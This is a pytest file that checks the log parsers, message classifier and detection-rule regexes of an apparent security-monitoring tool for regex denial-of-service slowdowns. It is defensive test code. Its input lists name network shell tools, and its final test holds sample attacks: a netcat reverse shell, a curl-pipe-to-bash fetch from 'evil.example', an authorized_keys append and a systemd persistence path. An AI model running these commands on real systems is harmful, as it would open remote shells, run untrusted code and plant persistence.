"""ReDoS regression tests.

Every parser, the syslog classifier and the detection-rule regexes face
attacker-controlled log text, so adversarial inputs must be handled in
bounded time:

* each call finishes within ``TIME_BUDGET`` seconds (best of two runs), and
* growing the input 10x (5_000 -> 50_000) grows the run time by less than
  ``MAX_GROWTH`` (guards against polynomial blow-up). The ratio check is
  skipped when the small run is too fast to measure reliably.
"""

from __future__ import annotations

import importlib
import re
import time
from collections.abc import Callable

import pytest

from sentinelai.parsers import available_parsers, get_parser
from sentinelai.parsers.classify import classify_message
from sentinelai.utils.regex import search_windowed

N_SMALL = 5_000
N_LARGE = 50_000
TIME_BUDGET = 1.0
MAX_GROWTH = 40.0
MIN_MEASURABLE = 0.005

PARSER_NAMES = sorted(available_parsers())

# --------------------------------------------------------------------------
# Seeds (valid lines, see tests/test_parsers.py)
# --------------------------------------------------------------------------

SEED_LINES: dict[str, str] = {
    "syslog": (
        "Jan  7 03:14:05 web01 sshd[1203]: "
        "Failed password for root from 203.0.113.55 port 51004 ssh2"
    ),
    "apache_access": (
        '203.0.113.9 - frank [07/Jan/2026:13:55:36 +0000] '
        '"GET /admin HTTP/1.1" 403 2326 "-" "curl/8.0"'
    ),
    "apache_error": (
        "[Wed Jan 07 03:14:15.123456 2026] [core:error] [pid 42:tid 7] "
        "[client 203.0.113.9:5678] File does not exist: /var/www/html/.env"
    ),
    "nginx_access": (
        '198.51.100.23 - - [07/Jan/2026:11:00:04 +0000] '
        '"POST /wp-login.php HTTP/1.1" 401 153 "-" "python-requests/2.31"'
    ),
    "nginx_error": (
        '2026/01/07 03:14:15 [error] 123#123: *45 open() failed, '
        'client: 203.0.113.9, server: example.com, request: "GET /x HTTP/1.1"'
    ),
    "docker": (
        'time="2026-01-07T03:14:15.123456789Z" level=warning '
        'msg="Running privileged container abcdef123456789012"'
    ),
    "fail2ban": (
        "2026-01-07 03:14:15,123 fail2ban.actions [123]: NOTICE [sshd] Ban 203.0.113.99"
    ),
    "ufw": (
        "Jan  7 03:14:15 web01 kernel: [1234.567] [UFW BLOCK] IN=eth0 OUT= "
        "MAC=00:11 SRC=203.0.113.5 DST=10.0.0.5 LEN=40 PROTO=TCP SPT=54321 DPT=22"
    ),
}
ALL_SEED_LINES = list(SEED_LINES.values())

# Message bodies (what the classifier sees after the syslog header is stripped).
SEED_MESSAGES = [
    "Failed password for invalid user admin from 203.0.113.55 port 51004 ssh2",
    "Accepted publickey for bob from 198.51.100.9 port 40000 ssh2",
    "authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.5 user=root",
    "alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update",
    "new user: name=backdoor, UID=0, GID=0, home=/home/backdoor, shell=/bin/bash",
    "(root) CMD (/usr/local/bin/backup.sh)",
    "[UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.5 DST=10.0.0.5 LEN=40 PROTO=TCP SPT=1 DPT=22",
    "reverse mapping checking getaddrinfo for host [203.0.113.5] failed - "
    "POSSIBLE BREAK-IN ATTEMPT",
    "pam_faillock(sshd:auth): Consecutive login failures for user bob",
    "Failed to start foo.service.",
]
CLASSIFY_SERVICES = [
    "sshd", "sudo", "su", "useradd", "passwd", "CRON", "systemd", "kernel", "dpkg",
    "docker", "ufw", None,
]

# --------------------------------------------------------------------------
# Adversarial input builders
# --------------------------------------------------------------------------

_Builder = Callable[[int], str]

GENERIC_PATTERNS: dict[str, _Builder] = {
    "spaces": lambda n: " " * n,
    "tabs": lambda n: "\t" * n,
    "mixed_ws": lambda n: " \t" * (n // 2),
    "double_quotes": lambda n: '"' * n,
    "single_quotes": lambda n: "'" * n,
    "letter_a": lambda n: "a" * n,
    "src_dst": lambda n: "SRC=1 DST=" * (n // 10),
    "open_brackets": lambda n: "[" * n,
    "close_brackets": lambda n: "]" * n,
    "triple_lt": lambda n: "<<<" * (n // 3),
    "x_space": lambda n: "x " * (n // 2),
    "quoted_x": lambda n: '"x ' * (n // 3),
    "digits_dots": lambda n: "1." * (n // 2),
    "colons": lambda n: ":" * n,
    "equals": lambda n: "=" * n,
    "backslashes": lambda n: "\\" * n,
}

#: Regex-specific prefixes: partial matches that force maximal backtracking.
RULE_PREFIXES = [
    "nc ", "ncat ", "netcat ", "nc -", "bash -i >& ", "socat ", "python -c ", "python3.11 -c ",
    "perl -e ", "php -r ", "mkfifo ", "mkfifo /tmp/f; ", "rm ", "rm /tmp/", "curl ", "wget ",
    "curl http://x | ", "base64 ", "chmod +x ", "/dev/tcp/", "/dev/tcp/1.1.1.1/", "/tmp/",
    "/etc/systemd/system/", "/etc/init.d/", "/etc/profile.d/", "systemctl ", "ssh-keygen",
    ".ssh/id_", "authorized_key",
]
RULE_TAILS: dict[str, _Builder] = {
    "spaces": lambda n: " " * n,
    "a": lambda n: "a" * n,
    "dashes": lambda n: "-" * n,
    "socket_words": lambda n: " socket" * (n // 7),
    "slash_tmp": lambda n: "/tmp/" * (n // 5),
    "dash_e_words": lambda n: " -x" * (n // 3),
    "semicolons": lambda n: "; " * (n // 2),
}


def _seed_cases() -> dict[str, _Builder]:
    """Valid seed prefix (cut at several points) + junk tail, per parser."""
    cases: dict[str, _Builder] = {}
    for name, seed in SEED_LINES.items():
        cuts = (("half", len(seed) // 2), ("full", len(seed)), ("n-3", len(seed) - 3))
        for cut_label, cut in cuts:
            prefix = seed[:cut]
            for tail_label, tail in (
                ("spaces", " "),
                ("a", "a"),
                ("quote", '"'),
                ("bracket", "["),
                ("x_space", "x "),
                ("tab", "\t"),
            ):
                cases[f"seed:{name}:{cut_label}:{tail_label}"] = (
                    lambda n, p=prefix, t=tail: p + t * n
                )
    return cases


SEED_CASES = _seed_cases()
INPUT_CASES: dict[str, _Builder] = {**GENERIC_PATTERNS, **SEED_CASES}

# --------------------------------------------------------------------------
# Measurement helpers
# --------------------------------------------------------------------------


def _best_of_two(func: Callable[[], object]) -> float:
    best = float("inf")
    for _ in range(2):
        start = time.perf_counter()
        func()
        best = min(best, time.perf_counter() - start)
    return best


def _assert_bounded(
    label: str, make_call: Callable[[str], Callable[[], object]], build: _Builder
) -> None:
    small = _best_of_two(make_call(build(N_SMALL)))
    large = _best_of_two(make_call(build(N_LARGE)))
    assert small < TIME_BUDGET, f"{label}: n={N_SMALL} took {small:.3f}s"
    assert large < TIME_BUDGET, f"{label}: n={N_LARGE} took {large:.3f}s"
    if small >= MIN_MEASURABLE:
        growth = large / small
        assert growth < MAX_GROWTH, (
            f"{label}: 10x input grew time {growth:.1f}x ({small:.4f}s -> {large:.4f}s)"
        )


def _resolve_pattern(module_path: str, attr: str) -> re.Pattern[str]:
    try:
        module = importlib.import_module(module_path)
    except ImportError:
        pytest.skip(f"module {module_path} not importable")
    pattern = getattr(module, attr, None)
    if not isinstance(pattern, re.Pattern):
        pytest.skip(f"{module_path}.{attr} no longer exists (renamed or moved)")
    return pattern


# --------------------------------------------------------------------------
# Parsers
# --------------------------------------------------------------------------


@pytest.mark.parametrize("case", sorted(INPUT_CASES))
@pytest.mark.parametrize("parser_name", PARSER_NAMES)
def test_parse_line_adversarial_input_is_bounded(parser_name: str, case: str) -> None:
    parser = get_parser(parser_name)

    def make_call(text: str) -> Callable[[], object]:
        return lambda: parser.parse_line(text)

    _assert_bounded(f"{parser_name}/{case}", make_call, INPUT_CASES[case])


@pytest.mark.parametrize("case", sorted(GENERIC_PATTERNS))
@pytest.mark.parametrize("parser_name", PARSER_NAMES)
def test_match_score_adversarial_lines_is_bounded(parser_name: str, case: str) -> None:
    parser = get_parser(parser_name)
    build = GENERIC_PATTERNS[case]

    def make_call(text: str) -> Callable[[], object]:
        lines = [text] * 3
        return lambda: parser.match_score(lines)

    _assert_bounded(f"{parser_name}.match_score/{case}", make_call, build)


# --------------------------------------------------------------------------
# classify_message
# --------------------------------------------------------------------------


def _classify_cases() -> dict[str, _Builder]:
    cases: dict[str, _Builder] = dict(GENERIC_PATTERNS)
    for index, message in enumerate(SEED_MESSAGES):
        for tail_label, tail in (("spaces", " "), ("a", "a"), ("quote", "'"), ("bracket", "[")):
            cases[f"msg{index}:{tail_label}"] = lambda n, m=message, t=tail: m + t * n
        cases[f"msg{index}:half+x_space"] = (
            lambda n, m=message: m[: len(m) // 2] + "x " * (n // 2)
        )
    return cases


CLASSIFY_CASES = _classify_cases()


@pytest.mark.parametrize("case", sorted(CLASSIFY_CASES))
def test_classify_message_adversarial_message_is_bounded(case: str) -> None:
    def make_call(text: str) -> Callable[[], object]:
        def run() -> None:
            for service in CLASSIFY_SERVICES:
                classify_message(service, text)

        return run

    _assert_bounded(f"classify_message/{case}", make_call, CLASSIFY_CASES[case])


@pytest.mark.parametrize("case", sorted(GENERIC_PATTERNS))
def test_classify_message_adversarial_service_is_bounded(case: str) -> None:
    def make_call(text: str) -> Callable[[], object]:
        return lambda: classify_message(text, "Failed password for root from 1.2.3.4")

    _assert_bounded(f"classify_message(service)/{case}", make_call, GENERIC_PATTERNS[case])


# --------------------------------------------------------------------------
# Detection-rule regexes
# --------------------------------------------------------------------------

_NETWORK = "sentinelai.detection.rules.network"
_PERSISTENCE = "sentinelai.detection.rules.persistence"
RULE_REGEXES = [
    (_NETWORK, "_REVERSE_SHELL"),
    (_PERSISTENCE, "_SUSPICIOUS_CRON_CMD"),
    (_PERSISTENCE, "_SSH_KEY_TOUCH"),
    (_PERSISTENCE, "_PERSISTENCE_PATHS"),
]


def _rule_cases() -> dict[str, _Builder]:
    cases: dict[str, _Builder] = dict(GENERIC_PATTERNS)
    for prefix in RULE_PREFIXES:
        for tail_label, tail in RULE_TAILS.items():
            cases[f"{prefix.strip()}|{tail_label}"] = lambda n, p=prefix, t=tail: p + t(n)
        # prefix repeated: "nc nc nc ..." style nesting
        cases[f"{prefix.strip()}|repeated"] = lambda n, p=prefix: p * max(1, n // len(p))
    for name, seed in SEED_LINES.items():
        cases[f"seed:{name}|junk"] = lambda n, s=seed: s + " x" * (n // 2)
    return cases


RULE_CASES = _rule_cases()


#: Suspected real quadratic behaviour in src/ (reported, NOT fixed here). A single line
#: made of a repeated command word makes the unanchored search retry the line-long
#: gap from every start position: "nc " * 16_667 takes ~2s in _REVERSE_SHELL, "curl " * 10_000 grows
#: ~100x for a 10x longer input in _SUSPICIOUS_CRON_CMD.
_QUADRATIC_REVERSE_SHELL_PREFIXES = [
    "nc ", "nc -", "ncat ", "netcat ", "socat ", "python -c ", "python3.11 -c ", "perl -e ",
    "php -r ",
]
_QUADRATIC_CRON_PREFIXES = ["curl ", "wget "]
KNOWN_QUADRATIC: set[tuple[str, str]] = {
    ("_REVERSE_SHELL", f"{p.strip()}|repeated") for p in _QUADRATIC_REVERSE_SHELL_PREFIXES
} | {("_SUSPICIOUS_CRON_CMD", f"{p.strip()}|repeated") for p in _QUADRATIC_CRON_PREFIXES}


def _rule_params() -> list[object]:
    params: list[object] = []
    for module_path, attr in RULE_REGEXES:
        for case in sorted(RULE_CASES):
            if (attr, case) in KNOWN_QUADRATIC:
                continue  # covered by test_known_quadratic_rule_regex_scales_linearly
            params.append(pytest.param(module_path, attr, case, id=f"{attr}-{case}"))
    return params


@pytest.mark.parametrize(("module_path", "attr", "case"), _rule_params())
def test_rule_regex_adversarial_input_is_bounded(module_path: str, attr: str, case: str) -> None:
    pattern = _resolve_pattern(module_path, attr)

    def make_call(text: str) -> Callable[[], object]:
        return lambda: pattern.search(text)

    _assert_bounded(f"{attr}/{case}", make_call, RULE_CASES[case])


def _known_quadratic_params() -> list[object]:
    params: list[object] = []
    for module_path, attr in RULE_REGEXES:
        for name, case in sorted(KNOWN_QUADRATIC):
            if name == attr:
                params.append(pytest.param(module_path, attr, case, id=f"{attr}-{case}"))
    return params


@pytest.mark.parametrize(("module_path", "attr", "case"), _known_quadratic_params())
def test_known_quadratic_rule_regex_scales_linearly(
    module_path: str, attr: str, case: str
) -> None:
    pattern = _resolve_pattern(module_path, attr)
    build = RULE_CASES[case]
    start = time.perf_counter()
    search_windowed(pattern, build(N_LARGE))
    large = time.perf_counter() - start
    assert large < TIME_BUDGET, f"{attr}/{case}: n={N_LARGE} took {large:.3f}s"
    # The cron regex is only mildly over budget, so also compare against a 5x smaller input
    # without the "too fast to measure" escape hatch: linear is ~10x, quadratic ~100x.
    start = time.perf_counter()
    search_windowed(pattern, build(N_SMALL))
    small = max(time.perf_counter() - start, 1e-6)
    assert large / small < MAX_GROWTH, f"{attr}/{case}: grew {large / small:.0f}x for 10x input"


@pytest.mark.parametrize(("module_path", "attr"), RULE_REGEXES, ids=[a for _, a in RULE_REGEXES])
def test_rule_regex_still_matches_a_known_attack(module_path: str, attr: str) -> None:
    """Hardening must not have neutered the regexes (guards the guard)."""
    samples = {
        "_REVERSE_SHELL": "nc -e /bin/sh 203.0.113.5 4444",
        "_SUSPICIOUS_CRON_CMD": "curl http://evil.example/x.sh | bash",
        "_SSH_KEY_TOUCH": "echo key >> /root/.ssh/authorized_keys",
        "_PERSISTENCE_PATHS": "cp x /etc/systemd/system/evil.service",
    }
    pattern = _resolve_pattern(module_path, attr)
    assert pattern.search(samples[attr]) is not None
